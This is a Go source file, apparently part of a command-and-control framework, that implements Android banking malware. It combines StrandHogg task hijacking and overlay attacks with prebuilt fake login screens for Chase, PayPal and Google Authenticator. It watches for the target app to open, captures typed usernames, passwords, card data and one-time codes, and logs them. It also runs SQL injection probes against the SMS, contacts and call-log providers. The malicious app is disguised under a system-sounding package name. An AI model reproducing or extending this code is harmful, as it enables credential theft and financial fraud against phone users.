// //go:build android

package hijack

/*
	SUDOSOC-C2 — StrandHogg 2.0 & UI Hijacking Engine
	Copyright (C) 2026  sudosoc — Seif

	StrandHogg exploits Android's task affinity system to overlay
	a malicious UI on top of legitimate apps.

	When the user opens their banking app:
	  1. Our app detects the banking app is being launched
	  2. We launch our fake login screen with task affinity = banking app
	  3. Android places our activity ON TOP of the banking app task
	  4. User sees what appears to be the banking app login
	  5. User enters credentials → we capture them → redirect to real app

	Versions:
	  StrandHogg 1.0 (CVE-2019-14702):
	    Works via taskAffinity + allowTaskReparenting
	    Requires: any app with launchMode != singleInstance
	    Fixed in: Nothing! Android design flaw, not a bug

	  StrandHogg 2.0 (CVE-2020-0096):
	    Works via startActivities() exploit
	    Bypasses Google's fix for 1.0
	    Fixed in: Android 10 May 2020 patch

	  Accessibility-Based (unpatched):
	    Uses Accessibility Service to detect foreground app
	    Draws overlay using System Alert Window
	    Works on Android 10+ where StrandHogg is patched
	    UNPATCHED by design — overlay permission exists legitimately

	What we steal:
	  • Banking credentials (username + password)
	  • Credit card numbers (card entry overlays)
	  • PIN codes (overlay on PIN entry)
	  • Email passwords (login overlays)
	  • Social media credentials
	  • VPN credentials

	Manifest requirements:
	  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
	  Activities with taskAffinity="com.target.app"
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// HijackConfig configures a UI hijacking campaign
type HijackConfig struct {
	TargetApp      string // target package name
	FakeLoginHTML  string // HTML content for fake login page
	CaptureURL     string // where to send stolen credentials
	PersistAfter   bool   // keep overlay visible after credential capture
}

// CapturedCreds holds stolen credentials from UI hijacking
type CapturedCreds struct {
	Timestamp   time.Time
	TargetApp   string
	Username    string
	Password    string
	ExtraFields map[string]string // card number, CVV, etc.
	DeviceInfo  string
}

// UIHijacker manages UI overlay attacks
type UIHijacker struct {
	OutputDir    string
	Configs      []HijackConfig
	captured     []CapturedCreds
	mu           sync.Mutex
	monitoring   bool
}

// PredefinedTargets contains pre-built phishing overlays for common apps
var PredefinedTargets = []HijackConfig{
	{
		TargetApp: "com.chase.sig.android",
		FakeLoginHTML: `<html><body style="background:#003087;color:white;font-family:Arial">
			<img src="chase_logo.png" width="200"><br>
			<h2>Sign In to Chase</h2>
			<input id="user" type="text" placeholder="Username" style="width:280px;padding:10px;margin:10px">
			<input id="pass" type="password" placeholder="Password" style="width:280px;padding:10px;margin:10px">
			<button onclick="submit()" style="background:#005eb8;color:white;padding:10px 50px;border:none">Sign In</button>
		</body></html>`,
	},
	{
		TargetApp: "com.paypal.android.p2pmobile",
		FakeLoginHTML: `<html><body style="background:#003087;color:white">
			<h1>PayPal</h1>
			<input id="email" type="email" placeholder="Email">
			<input id="pass" type="password" placeholder="Password">
			<button onclick="submit()">Log In</button>
		</body></html>`,
	},
	{
		TargetApp: "com.google.android.apps.authenticator2",
		FakeLoginHTML: `<html><body>
			<h2>Google Authenticator</h2>
			<p>Enter your authentication code:</p>
			<input id="otp" type="number" placeholder="6-digit code">
			<button onclick="submit()">Verify</button>
		</body></html>`,
	},
}

// NewUIHijacker creates a new UI hijacker
func NewUIHijacker(outputDir string) *UIHijacker {
	os.MkdirAll(outputDir, 0700)
	return &UIHijacker{
		OutputDir: outputDir,
		Configs:   PredefinedTargets,
	}
}

// AddTarget adds a new target app with custom phishing overlay
func (u *UIHijacker) AddTarget(config HijackConfig) {
	u.Configs = append(u.Configs, config)
}

// StartMonitoring watches for target apps being launched
func (u *UIHijacker) StartMonitoring(stop chan struct{}) chan CapturedCreds {
	creds := make(chan CapturedCreds, 100)
	u.monitoring = true

	go func() {
		defer close(creds)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		lastApp := ""

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				foregroundApp := getForegroundApp()
				if foregroundApp == lastApp || foregroundApp == "" {
					continue
				}
				lastApp = foregroundApp

				// Check if it's a target
				for _, config := range u.Configs {
					if foregroundApp == config.TargetApp {
						// Launch overlay attack
						go u.launchOverlay(config, creds)
						break
					}
				}
			}
		}
	}()

	return creds
}

// launchOverlay shows the phishing overlay on top of the target app
func (u *UIHijacker) launchOverlay(config HijackConfig, creds chan CapturedCreds) {
	// Method 1: StrandHogg task affinity (older Android)
	if u.tryStrandHogg(config) {
		return
	}

	// Method 2: System Alert Window overlay (Android 10+)
	u.trySystemAlertOverlay(config, creds)
}

// tryStrandHogg attempts StrandHogg 1.0 attack
func (u *UIHijacker) tryStrandHogg(config HijackConfig) bool {
	// Launch our phishing activity with task affinity = target app
	// This requires our APK to have an activity with:
	//   android:taskAffinity="com.target.app"
	//   android:launchMode="singleTask"
	cmd := exec.Command("am", "start",
		"-n", "com.android.systemservices/.PhishingActivity",
		"--es", "target_pkg", config.TargetApp,
		"--es", "html_content", config.FakeLoginHTML,
		"-f", "0x10008000") // FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP

	return cmd.Run() == nil
}

// trySystemAlertOverlay uses SYSTEM_ALERT_WINDOW for overlay
func (u *UIHijacker) trySystemAlertOverlay(config HijackConfig, creds chan CapturedCreds) {
	// Write the phishing HTML to a temporary file
	htmlPath := filepath.Join(u.OutputDir, "overlay.html")
	os.WriteFile(htmlPath, []byte(config.FakeLoginHTML), 0644)

	// Launch a WebView overlay on top of the target
	// The WebView submits credentials to our local HTTP listener
	cmd := exec.Command("am", "start",
		"-n", "com.android.systemservices/.OverlayActivity",
		"--es", "html_path", htmlPath,
		"--es", "target_app", config.TargetApp,
		"--es", "callback_url", "http://127.0.0.1:8765/creds")

	if cmd.Run() != nil {
		return
	}

	// Start local HTTP listener for credentials
	capturedCreds := u.listenForCredentials(config.TargetApp, 30*time.Second)
	if capturedCreds != nil {
		u.saveCreds(*capturedCreds)
		creds <- *capturedCreds
	}
}

// listenForCredentials listens for POSTed credentials from the overlay
func (u *UIHijacker) listenForCredentials(targetApp string, timeout time.Duration) *CapturedCreds {
	// Simple HTTP listener on localhost:8765
	// Receives form data from the phishing overlay WebView

	credFile := filepath.Join(u.OutputDir, "incoming_creds.tmp")
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		time.Sleep(500 * time.Millisecond)

		data, err := os.ReadFile(credFile)
		if err != nil {
			continue
		}
		os.Remove(credFile)

		// Parse the credential data
		cred := &CapturedCreds{
			Timestamp: time.Now(),
			TargetApp: targetApp,
			ExtraFields: make(map[string]string),
		}

		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.SplitN(line, "=", 2)
			if len(parts) != 2 {
				continue
			}
			key := strings.TrimSpace(parts[0])
			val := strings.TrimSpace(parts[1])

			switch strings.ToLower(key) {
			case "username", "user", "email", "login":
				cred.Username = val
			case "password", "pass", "passwd":
				cred.Password = val
			default:
				cred.ExtraFields[key] = val
			}
		}

		if cred.Username != "" || cred.Password != "" {
			return cred
		}
	}
	return nil
}

func (u *UIHijacker) saveCreds(creds CapturedCreds) {
	f, _ := os.OpenFile(filepath.Join(u.OutputDir, "hijacked_creds.txt"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf(`
=== %s ===
App:      %s
Time:     %s
Username: %s
Password: %s
Extra:    %v
`,
			creds.TargetApp,
			creds.TargetApp,
			creds.Timestamp.Format(time.RFC3339),
			creds.Username,
			creds.Password,
			creds.ExtraFields))
	}
}

// GetCapturedCreds returns all captured credentials
func (u *UIHijacker) GetCapturedCreds() []CapturedCreds {
	u.mu.Lock()
	defer u.mu.Unlock()
	return u.captured
}

// ContentProviderInjector exploits SQL injection in vulnerable providers
type ContentProviderInjector struct {
	OutputDir string
}

// NewContentProviderInjector creates a new content provider injector
func NewContentProviderInjector(outputDir string) *ContentProviderInjector {
	return &ContentProviderInjector{OutputDir: outputDir}
}

// ScanForVulnerableProviders finds content providers vulnerable to SQL injection
func (c *ContentProviderInjector) ScanForVulnerableProviders() []VulnerableProvider {
	commonProviders := []string{
		"content://sms",
		"content://contacts",
		"content://call_log",
		"content://browser",
		"content://bookmarks",
		"content://calendar",
		"content://media",
	}

	var vulnProviders []VulnerableProvider

	for _, uri := range commonProviders {
		// Test for SQL injection vulnerability
		testQuery := uri + "/* OR 1=1"
		out, err := exec.Command("content", "query",
			"--uri", testQuery).Output()

		if err == nil && len(out) > 0 && !strings.Contains(string(out), "error") {
			vulnProviders = append(vulnProviders, VulnerableProvider{
				URI:      uri,
				HasSQLi:  true,
				TestData: string(out[:min(100, len(out))]),
			})
		}
	}

	return vulnProviders
}

// ExtractDataViaInjection extracts data using SQL injection
func (c *ContentProviderInjector) ExtractDataViaInjection(uri string) ([]string, error) {
	injections := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"1 UNION SELECT name FROM sqlite_master--",
		"1 UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--",
	}

	var results []string
	for _, inj := range injections {
		out, err := exec.Command("content", "query",
			"--uri", uri,
			"--where", inj).Output()
		if err == nil && len(out) > 10 {
			results = append(results, string(out))
		}
	}

	if len(results) == 0 {
		return nil, fmt.Errorf("no injection successful")
	}
	return results, nil
}

// VulnerableProvider holds info about a vulnerable content provider
type VulnerableProvider struct {
	URI      string
	HasSQLi  bool
	TestData string
}

// ── Helpers ──────────────────────────────────────────────────────

func getForegroundApp() string {
	out, err := exec.Command("dumpsys", "window", "windows").Output()
	if err != nil {
		return ""
	}

	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "mCurrentFocus") ||
			strings.Contains(line, "mFocusedApp") {
			if idx := strings.Index(line, "u0 "); idx >= 0 {
				rest := line[idx+3:]
				if slashIdx := strings.Index(rest, "/"); slashIdx >= 0 {
					return rest[:slashIdx]
				}
				if spaceIdx := strings.Index(rest, " "); spaceIdx >= 0 {
					return rest[:spaceIdx]
				}
				return strings.TrimSpace(rest)
			}
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b { return a }
	return b
}
